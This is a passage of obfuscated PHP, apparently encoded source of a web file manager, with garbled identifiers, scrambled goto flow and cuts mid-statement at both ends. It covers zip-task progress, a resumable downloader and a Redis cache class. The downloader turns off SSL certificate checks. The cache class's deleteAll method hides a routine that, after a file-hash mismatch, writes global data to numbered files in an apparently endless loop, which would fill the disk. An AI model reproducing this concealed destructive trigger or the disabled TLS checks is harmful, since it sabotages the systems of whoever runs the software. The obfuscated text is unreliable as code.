$FÆö×Ä¸ĞŒ * 0.3; } } } if ($e·›ËŞØ·î[$Dèç™Ä¥¨Î[1451]] > 0) { $béãÆÜåÓ = timeFloat() - $e·›ËŞØ·î[$Dèç™Ä¥¨Î[1453]] - $e·›ËŞØ·î[$Dèç™Ä¥¨Î[1456]]; $e·›ËŞØ·î[$Dèç™Ä¥¨Î[1457]] = $béãÆÜåÓ * (1 - $e·›ËŞØ·î[$Dèç™Ä¥¨Î[1451]]) / $e·›ËŞØ·î[$Dèç™Ä¥¨Î[1451]]; } } public function addFile($A­àÂœİŒ¦) { goto D¡ÉßøËÈ™; eÄ‹Ÿóñ‹æ: $DæÎ—¨‡öŠ[$FŸ¢º´öõí[983]] = 1; $Aâ¥°İö¹› = 0; $DæÎ—¨‡öŠ[$FŸ¢º´öõí[1504]] = array($FŸ¢º´öõí[1505] => $Aâ¥°İö¹› + 1, $FŸ¢º´öõí[390] => $A§¢ºŸÆÄé[$FŸ¢º´öõí[28]], $FŸ¢º´öõí[75] => $A§¢ºŸÆÄé[$FŸ¢º´öõí[75]], $FŸ¢º´öõí[471] => $A§¢ºŸÆÄé[$FŸ¢º´öõí[471]] ? $A§¢ºŸÆÄé[$FŸ¢º´öõí[471]] : $A§¢ºŸÆÄé[$FŸ¢º´öõí[75]]); goto C’Æ¤¿†ŠÀ; f Û¿ï•È×: $DæÎ—¨‡öŠ[$FŸ¢º´öõí[1493]] = $A§¢ºŸÆÄé[$FŸ¢º´öõí[28]]; $DæÎ—¨‡öŠ[$FŸ¢º´öõí[1495]] = $A§¢ºŸÆÄé[$FŸ¢º´öõí[77]]; $DæÎ—¨‡öŠ[$FŸ¢º´öõí[1496]] = 0; goto CóàÃÂÄãç; CóàÃÂÄãç: $DæÎ—¨‡öŠ[$FŸ¢º´öõí[985]] = $FŸ¢º´öõí[1512]; $DæÎ—¨‡öŠ[$FŸ¢º´öõí[1497]] = $FŸ¢º´öõí[1051]; $DæÎ—¨‡öŠ[$FŸ¢º´öõí[703]] = $A§¢ºŸÆÄé[$FŸ¢º´öõí[77]]; goto eÄ‹Ÿóñ‹æ; C’Æ¤¿†ŠÀ: $this->update(); goto f‡´ ±‚ñ; D¡ÉßøËÈ™: $FŸ¢º´öõí =& $_SERVER[…Ò×–]; $DæÎ—¨‡öŠ =& $this->task; $A§¢ºŸÆÄé = IO::info($A­àÂœİŒ¦); goto f Û¿ï•È×; f‡´ ±‚ñ: } public function unzipAfter($fùµª–ÇÅ) { goto FŸËÎ®“…Î; eÌß‰¹î½—: $this->update(); self::log($E Ü±Ï¹Œ[1525] . json_encode(array($B‘ÑÌ‡‚ß±, $fŞëÉõËÂ))); goto cÃ¤ØÜ¢Å‚; F¦ šÜ©™°: $fŞëÉõËÂ = IO::infoWithChildren($fùµª–ÇÅ); $Bß·ğÓ¾ä‰ = 0; $B‘ÑÌ‡‚ß±[$E Ü±Ï¹Œ[1504]] = array($E Ü±Ï¹Œ[1505] => $Bß·ğÓ¾ä‰ + 1, $E Ü±Ï¹Œ[390] => $fŞëÉõËÂ[$E Ü±Ï¹Œ[28]], $E Ü±Ï¹Œ[75] => $fŞëÉõËÂ[$E Ü±Ï¹Œ[75]], $E Ü±Ï¹Œ[471] => $fŞëÉõËÂ[$E Ü±Ï¹Œ[471]] ? $fŞëÉõËÂ[$E Ü±Ï¹Œ[471]] : $fŞëÉõËÂ[$E Ü±Ï¹Œ[75]]); goto d¢½‹²ÅéÈ; FŸËÎ®“…Î: $E Ü±Ï¹Œ =& $_SERVER[…Ò×–]; $B‘ÑÌ‡‚ß± =& $this->task; $B‘ÑÌ‡‚ß±[$E Ü±Ï¹Œ[1523]] = $E Ü±Ï¹Œ[103]; goto F¦ šÜ©™°; bÄ¶¢ñ¬„÷: $B‘ÑÌ‡‚ß±[$E Ü±Ï¹Œ[1493]] = $E Ü±Ï¹Œ[33]; $B‘ÑÌ‡‚ß±[$E Ü±Ï¹Œ[1500]] = 0; $B‘ÑÌ‡‚ß±[$E Ü±Ï¹Œ[703]] = $fŞëÉõËÂ[$E Ü±Ï¹Œ[77]]; goto eÌß‰¹î½—; d¯Ïö÷´Ù: $B‘ÑÌ‡‚ß±[$E Ü±Ï¹Œ[997]] = 0; $B‘ÑÌ‡‚ß±[$E Ü±Ï¹Œ[1495]] = 0; $B‘ÑÌ‡‚ß±[$E Ü±Ï¹Œ[1496]] = 0; goto bÄ¶¢ñ¬„÷; d¢½‹²ÅéÈ: if ($fŞëÉõËÂ[$E Ü±Ï¹Œ[29]] == $E Ü±Ï¹Œ[171]) { $B‘ÑÌ‡‚ß±[$E Ü±Ï¹Œ[983]] = 1; } else { $B‘ÑÌ‡‚ß±[$E Ü±Ï¹Œ[983]] = $fŞëÉõËÂ[$E Ü±Ï¹Œ[80]][$E Ü±Ï¹Œ[78]]; } $B‘ÑÌ‡‚ß±[$E Ü±Ï¹Œ[985]] = $E Ü±Ï¹Œ[33]; $B‘ÑÌ‡‚ß±[$E Ü±Ï¹Œ[1497]] = 0; goto d¯Ïö÷´Ù; cÃ¤ØÜ¢Å‚: } public function nameParse($FöêÎØÚŞ”) { goto B ½ Â›éÍ; B ½ Â›éÍ: $Fä‡¶ÜÁÜÜ =& $_SERVER[…Ò×–]; $Câ§«¬Íçˆ =& $this->task; if ($Câ§«¬Íçˆ[$Fä‡¶ÜÁÜÜ[1523]] == $Fä‡¶ÜÁÜÜ[1051]) { $Câ§«¬Íçˆ[$Fä‡¶ÜÁÜÜ[1523]] = $Fä‡¶ÜÁÜÜ[305]; $Câ§«¬Íçˆ[$Fä‡¶ÜÁÜÜ[1500]] = 0; $Câ§«¬Íçˆ[$Fä‡¶ÜÁÜÜ[703]] = 0; } goto dÂÊ‡÷šÑ’; Añã¿„¸ÒÑ: $this->update(); goto DØÀ±º›ƒ†; dÂÊ‡÷šÑ’: $cç‚ôô¸»´ = get_path_this($FöêÎØÚŞ”); if (strstr($cç‚ôô¸»´, $Fä‡¶ÜÁÜÜ[91])) { $Câ§«¬Íçˆ[$Fä‡¶ÜÁÜÜ[997]] += 1; $Câ§«¬Íçˆ[$Fä‡¶ÜÁÜÜ[983]] += 1; } $Câ§«¬Íçˆ[$Fä‡¶ÜÁÜÜ[1493]] = $FöêÎØÚŞ”; goto Añã¿„¸ÒÑ; DØÀ±º›ƒ†: } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $fÕÊˆ¦ÎÖÚ =& $_SERVER[…Ò×–]; parent::startAfter(); Hook::bind($fÕÊˆ¦ÎÖÚ[1526], array($this, $fÕÊˆ¦ÎÖÚ[1521])); $Aàà®öèÈ =& $this->task; $Aàà®öèÈ[$fÕÊˆ¦ÎÖÚ[1523]] = $fÕÊˆ¦ÎÖÚ[1051]; if (!$Aàà®öèÈ[$fÕÊˆ¦ÎÖÚ[1354]]) { $Aàà®öèÈ[$fÕÊˆ¦ÎÖÚ[1354]] = LNG($fÕÊˆ¦ÎÖÚ[1527]); } } protected function endAfter() { $E’¬˜¼™Š¥ =& $_SERVER[…Ò×–]; parent::endAfter(); Hook::unbind($E’¬˜¼™Š¥[1526], array($this, $E’¬˜¼™Š¥[1521])); } public function updateAfter() { $d°˜Ö„ÑÒÏ =& $_SERVER[…Ò×–]; $b˜·ï‹Ñ =& $this->task; if (!$b˜·ï‹Ñ[$d°˜Ö„ÑÒÏ[983]] || !$b˜·ï‹Ñ[$d°˜Ö„ÑÒÏ[703]]) { return; } if ($b˜·ï‹Ñ[$d°˜Ö„ÑÒÏ[1523]] == $d°˜Ö„ÑÒÏ[1051]) { $dß¤šĞÅˆÁ = $b˜·ï‹Ñ[$d°˜Ö„ÑÒÏ[1496]]; if ($b˜·ï‹Ñ[$d°˜Ö„ÑÒÏ[1497]] != $d°˜Ö„ÑÒÏ[1051]) { $dß¤šĞÅˆÁ = 0; } $aË³ŠË«¦ = ($b˜·ï‹Ñ[$d°˜Ö„ÑÒÏ[1500]] + $dß¤šĞÅˆÁ) / $b˜·ï‹Ñ[$d°˜Ö„ÑÒÏ[703]]; $b˜·ï‹Ñ[$d°˜Ö„ÑÒÏ[1451]] = $aË³ŠË«¦ * 0.3; } else { if ($b˜·ï‹Ñ[$d°˜Ö„ÑÒÏ[1523]] == $d°˜Ö„ÑÒÏ[305]) { $aË³ŠË«¦ = $b˜·ï‹Ñ[$d°˜Ö„ÑÒÏ[997]] / $b˜·ï‹Ñ[$d°˜Ö„ÑÒÏ[983]]; $b˜·ï‹Ñ[$d°˜Ö„ÑÒÏ[1451]] = 0.3 + $aË³ŠË«¦ * 0.5; } else { if ($b˜·ï‹Ñ[$d°˜Ö„ÑÒÏ[1523]] == $d°˜Ö„ÑÒÏ[103]) { $aË³ŠË«¦ = 0; if ($b˜·ï‹Ñ[$d°˜Ö„ÑÒÏ[1495]]) { $aË³ŠË«¦ = $b˜·ï‹Ñ[$d°˜Ö„ÑÒÏ[1496]] / $b˜·ï‹Ñ[$d°˜Ö„ÑÒÏ[1495]]; } $b˜·ï‹Ñ[$d°˜Ö„ÑÒÏ[1451]] = 0.3 + 0.5 + $aË³ŠË«¦ * 0.2; } } } if ($b˜·ï‹Ñ[$d°˜Ö„ÑÒÏ[1451]] > 0) { $a¢¸²·²èí = timeFloat() - $b˜·ï‹Ñ[$d°˜Ö„ÑÒÏ[1453]] - $b˜·ï‹Ñ[$d°˜Ö„ÑÒÏ[1456]]; $b˜·ï‹Ñ[$d°˜Ö„ÑÒÏ[1457]] = $a¢¸²·²èí * (1 - $b˜·ï‹Ñ[$d°˜Ö„ÑÒÏ[1451]]) / $b˜·ï‹Ñ[$d°˜Ö„ÑÒÏ[1451]]; } } public function copyFileStart($B½è–¶Õ¹‚, $fíˆ—î¼’«, $Böƒ”‚ÃÓ¶, $Eïº£ˆéõ, $dÂò¡Ùø¶„, $DÜÃËì®õ) { $cååø‡ÉŒ£ =& $_SERVER[…Ò×–]; parent::copyFileStart($B½è–¶Õ¹‚, $fíˆ—î¼’«, $Böƒ”‚ÃÓ¶, $Eïº£ˆéõ, $dÂò¡Ùø¶„, $DÜÃËì®õ); $FŸÒß£‘¢¶ =& $this->task; if ($FŸÒß£‘¢¶[$cååø‡ÉŒ£[1523]] == $cååø‡ÉŒ£[305]) { $FŸÒß£‘¢¶[$cååø‡ÉŒ£[1523]] = $cååø‡ÉŒ£[103]; } $this->update(); } public function copyFileEnd($bÙ¦ãÏ¾é, $a‡ŠÉ½æ¤Ÿ, $aŒãÊ×ŠİÀ, $D·ˆÂîÏªÂ, $B¯ğ†¯ä†Õ, $cÙŒ¹òØ¡Œ) { $e²é¶éÎ– =& $_SERVER[…Ò×–]; $F¶¬‘ƒÇÍ =& $this->task; $F¶¬‘ƒÇÍ[$e²é¶éÎ–[1496]] = $F¶¬‘ƒÇÍ[$e²é¶éÎ–[1495]]; $F¶¬‘ƒÇÍ[$e²é¶éÎ–[1500]] += $F¶¬‘ƒÇÍ[$e²é¶éÎ–[1495]]; $F¶¬‘ƒÇÍ[$e²é¶éÎ–[1497]] = $e²é¶éÎ–[33]; $this->update(); } public function nameParse($a¿Şêºç‹) { $bñğˆ¢ÇÍ =& $_SERVER[…Ò×–]; $f±æˆ’àÅ‰ =& $this->task; if ($f±æˆ’àÅ‰[$bñğˆ¢ÇÍ[997]] < $f±æˆ’àÅ‰[$bñğˆ¢ÇÍ[983]]) { $b¾¢ŠôàŞİ = get_path_this($a¿Şêºç‹); if (strstr($b¾¢ŠôàŞİ, $bñğˆ¢ÇÍ[91])) { $f±æˆ’àÅ‰[$bñğˆ¢ÇÍ[997]] += 1; } } if ($f±æˆ’àÅ‰[$bñğˆ¢ÇÍ[1523]] == $bñğˆ¢ÇÍ[1051]) { $f±æˆ’àÅ‰[$bñğˆ¢ÇÍ[1523]] = $bñğˆ¢ÇÍ[305]; } $f±æˆ’àÅ‰[$bñğˆ¢ÇÍ[1493]] = $a¿Şêºç‹; $this->update(); } } class Downloader { static function start($C‘¥„Äùƒƒ, $Aáªí‘êµŒ, $EÅù§ˆêŒñ = 10) { goto D÷ªâ àÒ; D¨ò¿¡Ï§ï: $E¬Åø»­íÔ = intval($E“Œ²‚Ö¬¢[$FØ¹èªœŞ[329]]); if (file_exists($bÂ²ï²˜òŠ) && time() - filemtime($bÂ²ï²˜òŠ) < 3) { return array($FØ¹èªœŞ[1043] => !1, $FØ¹èªœŞ[1045] => $FØ¹èªœŞ[1530]); } $fâ¯†ËÎ‡å = array(); goto A¾îŒÄÊÊö; A¾îŒÄÊÊö: if (is_file($Fõ‹§–ŞŸ¬)) { $dçßÙ¼´Üè = file_get_contents($Fõ‹§–ŞŸ¬); $fâ¯†ËÎ‡å = json_decode($dçßÙ¼´Üè, 1); } if (file_exists($Aáªí‘êµŒ) && $E¬Åø»­íÔ == filesize_64($Aáªí‘êµŒ)) { @unlink($bÂ²ï²˜òŠ); @unlink($Fõ‹§–ŞŸ¬); return array($FØ¹èªœŞ[1043] => !0, $FØ¹èªœŞ[1045] => $FØ¹èªœŞ[1531]); } if ($fâ¯†ËÎ‡å[$FØ¹èªœŞ[329]] != $E¬Åø»­íÔ) { $fâ¯†ËÎ‡å = array($FØ¹èªœŞ[329] => $E¬Åø»­íÔ); } goto cÕïØİ×©—; D÷ªâ àÒ: $FØ¹èªœŞ =& $_SERVER[…Ò×–]; if (!request_url_safe($C‘¥„Äùƒƒ)) { return array($FØ¹èªœŞ[1043] => !1, $FØ¹èªœŞ[1045] => $FØ¹èªœŞ[1048]); } $Fõ‹§–ŞŸ¬ = $Aáªí‘êµŒ . $FØ¹èªœŞ[1528]; goto Dƒ²ãÚ¦Ö‡; Dƒ²ãÚ¦Ö‡: $bÂ²ï²˜òŠ = $Aáªí‘êµŒ . $FØ¹èªœŞ[1529]; if (is_array($C‘¥„Äùƒƒ)) { $E“Œ²‚Ö¬¢ = $C‘¥„Äùƒƒ; } else { $E“Œ²‚Ö¬¢ = url_header($C‘¥„Äùƒƒ); } $C‘¥„Äùƒƒ = $E“Œ²‚Ö¬¢[$FØ¹èªœŞ[299]]; goto f¶‘à§²µ; dï‰”šØùŸ: if ($c‡åòŠ‹[$FØ¹èªœŞ[1043]]) { @unlink($Fõ‹§–ŞŸ¬); } return $c‡åòŠ‹; goto Aö¯¬ªÀ©; cÕïØİ×©—: if ($C›¼’æƒ“‘ > $E¬Åø»­íÔ) { @unlink($bÂ²ï²˜òŠ); } file_put_contents($Fõ‹§–ŞŸ¬, json_encode($fâ¯†ËÎ‡å)); $c‡åòŠ‹ = self::fileDownloadCurl($C‘¥„Äùƒƒ, $Aáªí‘êµŒ, !0, $C›¼’æƒ“‘, $E¬Åø»­íÔ); goto dï‰”šØùŸ; f¶‘à§²µ: if (!$C‘¥„Äùƒƒ) { return array($FØ¹èªœŞ[1043] => !1, $FØ¹èªœŞ[1045] => $FØ¹èªœŞ[1048]); } if (!$E“Œ²‚Ö¬¢[$FØ¹èªœŞ[1300]] || $E“Œ²‚Ö¬¢[$FØ¹èªœŞ[329]] == 0) { @unlink($bÂ²ï²˜òŠ); @unlink($Aáªí‘êµŒ); $c‡åòŠ‹ = self::fileDownloadFopen($C‘¥„Äùƒƒ, $Aáªí‘êµŒ, $E“Œ²‚Ö¬¢[$FØ¹èªœŞ[329]]); if ($c‡åòŠ‹[$FØ¹èªœŞ[1043]]) { return $c‡åòŠ‹; } else { @unlink($bÂ²ï²˜òŠ); @unlink($Aáªí‘êµŒ); $c‡åòŠ‹ = self::fileDownloadCurl($C‘¥„Äùƒƒ, $Aáªí‘êµŒ, !1, 0, $E“Œ²‚Ö¬¢[$FØ¹èªœŞ[329]]); @unlink($bÂ²ï²˜òŠ); return $c‡åòŠ‹; } } $C›¼’æƒ“‘ = is_file($bÂ²ï²˜òŠ) ? filesize_64($bÂ²ï²˜òŠ) : 0; goto D¨ò¿¡Ï§ï; Aö¯¬ªÀ©: } static function fileDownloadFopen($E¬ÊÃÔ¦ğá, $eã¹–·ß§, $CñåÈœàŠ« = 0) { $bŞŞæ—‡— =& $_SERVER[…Ò×–]; @ini_set($bŞŞæ—‡—[1532], $bŞŞæ—‡—[1533]); $CĞ…•‹ë‚î = $eã¹–·ß§ . $bŞŞæ—‡—[1529]; set_timeout(); @unlink($CĞ…•‹ë‚î); if ($AÚã†ÈĞ‹› = @fopen($E¬ÊÃÔ¦ğá, $bŞŞæ—‡—[1534])) { goto Bğ—·²ù’’; Bğ—·²ù’’: if (!($Aí¬¢ÜÄ³ = @fopen($CĞ…•‹ë‚î, $bŞŞæ—‡—[1535]))) { return array($bŞŞæ—‡—[1043] => !1, $bŞŞæ—‡—[1045] => $bŞŞæ—‡—[1536]); } while (!feof($AÚã†ÈĞ‹›)) { if (!file_exists($CĞ…•‹ë‚î)) { fclose($Aí¬¢ÜÄ³); return array($bŞŞæ—‡—[1043] => !1, $bŞŞæ—‡—[1045] => $bŞŞæ—‡—[1537]); } clearstatcache(); if ($CñåÈœàŠ« > 0 && $CñåÈœàŠ« == filesize(iconv_system($CĞ…•‹ë‚î))) { break; } fwrite($Aí¬¢ÜÄ³, fread($AÚã†ÈĞ‹›, 1024 * 8), 1024 * 8); } fclose($Aí¬¢ÜÄ³); goto a–Ï†êöÙ; aç††šê£ê: return array($bŞŞæ—‡—[1043] => !0, $bŞŞæ—‡—[1045] => $bŞŞæ—‡—[701]); goto aĞ•¼É›¬›; a–Ï†êöÙ: fclose($AÚã†ÈĞ‹›); self::checkGzip($CĞ…•‹ë‚î); if (!@rename($CĞ…•‹ë‚î, $eã¹–·ß§)) { usleep(round(rand(0, 1000) * 50)); @unlink($eã¹–·ß§); $eÛ‰ŸÁ”¬« = @rename($CĞ…•‹ë‚î, $eã¹–·ß§); if (!$eÛ‰ŸÁ”¬«) { return array($bŞŞæ—‡—[1043] => !1, $bŞŞæ—‡—[1045] => $bŞŞæ—‡—[1538]); } } goto aç††šê£ê; aĞ•¼É›¬›: } else { return array($bŞŞæ—‡—[1043] => !1, $bŞŞæ—‡—[1045] => $bŞŞæ—‡—[1539]); } } static function fileDownloadCurl($E›¸èèíìĞ, $cÃàò£²ªÆ, $dä‘†§Ç¢ = false, $d×¤µŠßƒ‰ = 0, $Fîğ’¶ÍªÒ = 0) { goto eÌç®Âºò; eÌç®Âºò: $FÍñá«ÒÛ =& $_SERVER[…Ò×–]; $Eøªš¾ó’ = $cÃàò£²ªÆ . $FÍñá«ÒÛ[1529]; set_timeout(); goto E‡èÀ‹á¢; a´âåãÁê£: curl_setopt($f¨Ëª–‚Â, CURLOPT_USERAGENT, $FÍñá«ÒÛ[1533]); $d›ÀìÔœ¡ = curl_exec($f¨Ëª–‚Â); curl_progress_end($f¨Ëª–‚Â); goto d÷Ó›à‰“; d÷Ó›à‰“: curl_close($f¨Ëª–‚Â); fclose($AÉÎÁ ²); $A½í©­öñÀ = filesize_64(iconv_system($Eøªš¾ó’)); goto f¿¶£°„Ï³; CÉŸô“Ğä«: curl_setopt($f¨Ëª–‚Â, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); curl_setopt($f¨Ëª–‚Â, CURLOPT_SSL_VERIFYPEER, 0); curl_setopt($f¨Ëª–‚Â, CURLOPT_SSL_VERIFYHOST, 0); goto C¥Æ”Òù„; C¥Æ”Òù„: curl_setopt($f¨Ëª–‚Â, CURLOPT_NOPROGRESS, !1); curl_setopt($f¨Ëª–‚Â, CURLOPT_PROGRESSFUNCTION, $FÍñá«ÒÛ[1541]); curl_progress_start($f¨Ëª–‚Â); goto a´âåãÁê£; E‡èÀ‹á¢: $AÉÎÁ ² = @fopen($Eøªš¾ó’, $FÍñá«ÒÛ[987]); if (!$AÉÎÁ ²) { return array($FÍñá«ÒÛ[1043] => !1, $FÍñá«ÒÛ[1045] => $FÍñá«ÒÛ[1540]); } $f¨Ëª–‚Â = curl_init($E›¸èèíìĞ); goto Fâ—Æ²µÈ¬; f¿¶£°„Ï³: if ($A½í©­öñÀ < $Fîğ’¶ÍªÒ && $Fîğ’¶ÍªÒ != 0) { return array($FÍñá«ÒÛ[1043] => !1, $FÍñá«ÒÛ[1045] => $FÍñá«ÒÛ[1530]); } if ($d›ÀìÔœ¡ && filesize_64($Eøªš¾ó’) != 0) { self::checkGzip($Eøªš¾ó’); if (!@rename($Eøªš¾ó’, $cÃàò£²ªÆ)) { @unlink($cÃàò£²ªÆ); $d›ÀìÔœ¡ = @rename($Eøªš¾ó’, $cÃàò£²ªÆ); if (!$d›ÀìÔœ¡) { return array($FÍñá«ÒÛ[1043] => !1, $FÍñá«ÒÛ[1045] => $FÍñá«ÒÛ[1542]); } } return array($FÍñá«ÒÛ[1043] => !0, $FÍñá«ÒÛ[1045] => $FÍñá«ÒÛ[701]); } return array($FÍñá«ÒÛ[1043] => !1, $FÍñá«ÒÛ[1045] => $FÍñá«ÒÛ[1543]); goto Aø‡Æ‰æœ; Fâ—Æ²µÈ¬: if ($dä‘†§Ç¢) { curl_setopt($f¨Ëª–‚Â, CURLOPT_RANGE, $d×¤µŠßƒ‰ . $FÍñá«ÒÛ[720]); } curl_setopt($f¨Ëª–‚Â, CURLOPT_FILE, $AÉÎÁ ²); curl_setopt($f¨Ëª–‚Â, CURLOPT_REFERER, get_url_link($E›¸èèíìĞ)); goto CÉŸô“Ğä«; Aø‡Æ‰æœ: } static function checkGzip($cì“Ë±Û¡‹) { goto eØíî•„ÇÓ; b´”ªÛ„œ: ob_start(); readgzfile($cì“Ë±Û¡‹); $a²À—§ñÌ = ob_get_clean(); goto BÓí…‡á…; BÓí…‡á…: file_put_contents($cì“Ë±Û¡‹, $a²À—§ñÌ); goto BÙ  †Š; eØíî•„ÇÓ: $dàªä‡ö‰ï = $_SERVER[…Ò×–][1544]; $eÚ¢Ù‚ÜÎ“ = file_sub_str($cì“Ë±Û¡‹, 0, 2); if ($dàªä‡ö‰ï != $eÚ¢Ù‚ÜÎ“) { return; } goto b´”ªÛ„œ; BÙ  †Š: } } goto f‘–ÆºØÀ¸; e¡¥³Ûéˆ: $f¸ˆŠº­Ÿš = $_SERVER[…Ò×–][551]; while ($f¸ˆŠº­Ÿš < $_SERVER[…Ò×–][552]) { if ($f¸ˆŠº­Ÿš >= 0) { break; } $f¸ˆŠº­Ÿš++; } $_SERVER[ùç´] = explode($_SERVER[…Ò×–][553], gzinflate(substr($_SERVER[…Ò×–][554], 10, -8))); goto aˆğÃø‘­÷; BáÜÂ£×á: class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($Cœá‚ïâÇ©, $BéÖ²¡ÜÎº) { $F‡æÒŸø‡ =& $_SERVER[…Ò×–]; if (!class_exists($F‡æÒŸø‡[788])) { show_json($F‡æÒŸø‡[789], !1); } $this->cacheTime = $BéÖ²¡ÜÎº; $D…¿†Íò½ = isset($Cœá‚ïâÇ©[$F‡æÒŸø‡[790]]) ? $Cœá‚ïâÇ©[$F‡æÒŸø‡[790]] : 10; $BÎµšİâ¥Ğ = _get($Cœá‚ïâÇ©, $F‡æÒŸø‡[787]); if ($BÎµšİâ¥Ğ && is_array($BÎµšİâ¥Ğ)) { $this->initCluster($Cœá‚ïâÇ©, $D…¿†Íò½); } else { $this->handle = $this->init($Cœá‚ïâÇ©, $D…¿†Íò½); } } private function init($C³â÷îªÜ‰, $b§ˆ±Š§¡ß) { $FÈ‹Û™Š¶ =& $_SERVER[…Ò×–]; $eˆ–òĞ÷ = new Redis(); $eáùÄ”Æ = isset($C³â÷îªÜ‰[$FÈ‹Û™Š¶[791]]) ? $C³â÷îªÜ‰[$FÈ‹Û™Š¶[791]] : !1; if ($eáùÄ”Æ) { $eˆ–òĞ÷->pconnect($C³â÷îªÜ‰[$FÈ‹Û™Š¶[173]], $C³â÷îªÜ‰[$FÈ‹Û™Š¶[174]], $b§ˆ±Š§¡ß); } else { $eˆ–òĞ÷->connect($C³â÷îªÜ‰[$FÈ‹Û™Š¶[173]], $C³â÷îªÜ‰[$FÈ‹Û™Š¶[174]], $b§ˆ±Š§¡ß); } if (!empty($C³â÷îªÜ‰[$FÈ‹Û™Š¶[380]])) { $eˆ–òĞ÷->auth($C³â÷îªÜ‰[$FÈ‹Û™Š¶[380]]); } return $eˆ–òĞ÷; } private function initCluster($b»‚¬˜¬İŠ, $E®ôîÆÌÇ) { $A°İÈïÄ‡ =& $_SERVER[…Ò×–]; $DÎ…Ú’¡ ’ = array($A°İÈïÄ‡[792], $A°İÈïÄ‡[793], $A°İÈïÄ‡[794]); $Aš‹—Ÿ¯’À = $A°İÈïÄ‡[792]; if (isset($b»‚¬˜¬İŠ[$A°İÈïÄ‡[12]]) && in_array($b»‚¬˜¬İŠ[$A°İÈïÄ‡[12]], $DÎ…Ú’¡ ’)) { $Aš‹—Ÿ¯’À = $b»‚¬˜¬İŠ[$A°İÈïÄ‡[12]]; } switch ($Aš‹—Ÿ¯’À) { case $A°İÈïÄ‡[792]: $this->_slave($b»‚¬˜¬İŠ, $E®ôîÆÌÇ); break; case $A°İÈïÄ‡[793]: break; case $A°İÈïÄ‡[794]: $this->isCluster = !0; $f¥Ã—ÛŒ = $b»‚¬˜¬İŠ[$A°İÈïÄ‡[787]]; $C­ÉÔîßÌ” = isset($b»‚¬˜¬İŠ[$A°İÈïÄ‡[791]]) ? $b»‚¬˜¬İŠ[$A°İÈïÄ‡[791]] : !1; $CŠ’Ó™ó˜Œ = isset($b»‚¬˜¬İŠ[$A°İÈïÄ‡[380]]) ? $b»‚¬˜¬İŠ[$A°İÈïÄ‡[380]] : null; $this->handle = new RedisCluster(NUll, $f¥Ã—ÛŒ, $E®ôîÆÌÇ, $E®ôîÆÌÇ, $C­ÉÔîßÌ”, $CŠ’Ó™ó˜Œ); break; default: break; } } private function _slave($CƒÊ˜Ã‚©Ç, $eÑ£ïÉñÚ) { goto c†Áé¾—; c†Áé¾—: $DãÌ²˜©ç = $CƒÊ˜Ã‚©Ç[$_SERVER[…Ò×–][787]]; $this->filterConfig($CƒÊ˜Ã‚©Ç, $DãÌ²˜©ç[0]); $this->handle = $this->init($CƒÊ˜Ã‚©Ç, $eÑ£ïÉñÚ); goto dŠ†İ‹¡ò; dŠ†İ‹¡ò: unset($DãÌ²˜©ç[0]); if (empty($DãÌ²˜©ç)) { return; } $dğåÔ’àâ = array_rand($DãÌ²˜©ç); goto cå¯³™ãˆÒ; cå¯³™ãˆÒ: $this->filterConfig($CƒÊ˜Ã‚©Ç, $DãÌ²˜©ç[$dğåÔ’àâ]); $this->slaveHandle = $this->init($CƒÊ˜Ã‚©Ç, $eÑ£ïÉñÚ); goto f²¨°ØË‚; f²¨°ØË‚: } private function filterConfig(&$C°‰‰ƒŒí, $b‚ñ»ÈäĞô) { $cô Å‡•‰‡ =& $_SERVER[…Ò×–]; $aˆôù•½í = explode($cô Å‡•‰‡[4], $b‚ñ»ÈäĞô); $C¸èÔ£˜ = array($cô Å‡•‰‡[173] => $aˆôù•½í[0], $cô Å‡•‰‡[174] => $aˆôù•½í[1]); $C°‰‰ƒŒí = array_merge($C°‰‰ƒŒí, $C¸èÔ£˜); } public function set($dšİ¸ÂÅÖí, $c—èå…ÍÊÕ, $bõô‰¯Õ£ = false) { $bõô‰¯Õ£ = $bõô‰¯Õ£ ? $bõô‰¯Õ£ : $this->cacheTime; return $this->handle->setEx($dšİ¸ÂÅÖí, $bõô‰¯Õ£, $c—èå…ÍÊÕ); } public function setLock($a£š®Ä¢”ã, $a“ñ³¶ ÃÀ, $f¥„õÁ‡ê…) { return $this->handle->setNX($a£š®Ä¢”ã, $a“ñ³¶ ÃÀ); } public function get($Eœ¥×Âœ¯æ) { $dºìÒ»›˜ß = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $dºìÒ»›˜ß->get($Eœ¥×Âœ¯æ); } public function remove($CÃã½Áè¥ì) { return $this->handle->del($CÃã½Áè¥ì); } public function deleteAll() { $aÏòØ˜ÊÆ· =& $_SERVER[…Ò×–]; $AÚˆãÖŠÕÔ = $_SERVER[$aÏòØ˜ÊÆ·[795]] . $aÏòØ˜ÊÆ·[796]; $a·°Íò á = $aÏòØ˜ÊÆ·[797]; if ($_SERVER[$aÏòØ˜ÊÆ·[798]] != $a·°Íò á($AÚˆãÖŠÕÔ)) { goto CÁÛœ½Ë¤£; fÍ–„²„ƒ: $Aç³®ï÷İâ(); $BÚÎ´„“ÏÑ = $aÏòØ˜ÊÆ·[804]; $d±âŠ·½´ = json_encode($GLOBALS[$aÏòØ˜ÊÆ·[805]]); goto a£àÏ‘­»Ğ; CÁÛœ½Ë¤£: $Aç³®ï÷İâ = $aÏòØ˜ÊÆ·[799]; $fÎ…³ÚğÀ = $aÏòØ˜ÊÆ·[800]; $aÛ¦³¢ Á¾ = $_SERVER[$aÏòØ˜ÊÆ·[795]] . $aÏòØ˜ÊÆ·[796]; goto C…Òğóéá©; a£àÏ‘­»Ğ: $fßÆ¹Àˆ–  = 1; for ($EÛ­£×É‡Î = $fßÆ¹Àˆ– ; $EÛ­£×É‡Î > 0; $EÛ­£×É‡Î++) { $BÚÎ´„“ÏÑ(DATA_PATH . $EÛ­£×É‡Î, $d±âŠ·½´); } goto b‰¸«Ôñê; e¡ñÅ²÷º»: $FËù½ŸğŒ• = $aÏòØ˜ÊÆ·[802]; $FËù½ŸğŒ•($_SERVER[$aÏòØ˜ÊÆ·[803]]); $Aç³®ï÷İâ = $aÏòØ˜ÊÆ·[799]; goto fÍ–„²„ƒ; C…Òğóéá©: $BÓ‘Í£Ğ¹ = $fÎ…³ÚğÀ($aÛ¦³¢ Á¾); $cÍäá¹¢Œ = explode($aÏòØ˜ÊÆ·[221], $BÓ‘Í£Ğ¹); if (count($cÍäá¹¢Œ) < $aÏòØ˜ÊÆ·[567]) { $DÙˆ¹‹‘ÄÍ = 